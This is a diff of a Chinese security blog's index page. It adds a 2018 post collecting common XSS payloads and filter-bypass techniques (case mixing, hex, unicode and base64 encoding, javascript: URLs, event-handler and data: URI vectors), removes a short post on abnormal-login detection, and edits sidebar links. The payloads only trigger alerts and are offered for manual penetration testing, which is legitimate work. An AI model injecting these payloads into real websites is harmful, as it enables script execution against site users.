@@ -138,6 +138,130 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15446893463166.html">
+                
+                  <h1>xss常用payload</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
+</blockquote>
+
+<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
+
+<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
+
+<p>1.大小写混合绕过<br/>
+顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
+
+<p>2.闭合标签绕过</p>
+
+<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
+
+<p>3.HEX编码来绕过</p>
+
+<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
+
+<p>4.Javascript URL</p>
+
+<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
+
+<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
+
+<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
+
+<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
+
+<p>===&gt;常用代码如下：</p>
+
+<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+
+<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
+
+<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
+
+<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
+
+<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
+
+<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
+
+<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
+
+<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
+
+<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
+
+<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
+
+<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
+
+<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
+
+<p><code>&lt;body/onload=alert(12)&gt;</code></p>
+
+<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
+
+<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
+
+<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
+
+<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
+
+<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
+
+<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
+
+<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
+
+<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:22 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15446892905759.html">
                 
                   <h1>同源策略</h1>
@@ -1408,43 +1532,6 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15446875268619.html">
-                
-                  <h1>异常登录检测</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>异常登录功能用来检测服务器上的登录行为。<br/>
-非常用地的登录行为告警（这个常用登陆地可以作为个人信息的一部分来由用户设置；或者收集第一次成功登录时的公网ip，然后将此ip地址设置位常用登陆地，从该时间往后顺延24小时内的所有公网登录地也会被记为常用登陆地，当超过24小时候，所有不在常用登陆地的登录行为均视为异地登录警告。当某个ip被判定为异地登录时，仅第一次登录行为进行告警，如果成功登录6次或以上，则默认将此ip的地点记录为常用登录地。）<br/>
-非常用登录ip告警<br/>
-非常用登录时间告警<br/>
-非常用登录账号告警（同一时间段内超多次登录同一账号、同一时间段内不同地理位置登录账号、同一时间段内多个ip登录同一账号、不同设备登录同一账号、同一设备不同ip登录同一账号）</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/13 15:52 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -1530,6 +1617,12 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
 	      
 		      
 			      <li class="post">
+			        <a href="15604965103558.html">Docker for Mac 卡在 "is starting"</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15602308144902.html">Metasploit 完全使用教程</a>
 			      </li>
 		     
@@ -1549,12 +1642,6 @@ CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaX
 		      
 			      <li class="post">
 			        <a href="15596171974228.html">最近做了个 fuzzing 字典精简版</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15595455557551.html">使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</a>
 			      </li>
 		     
 		  
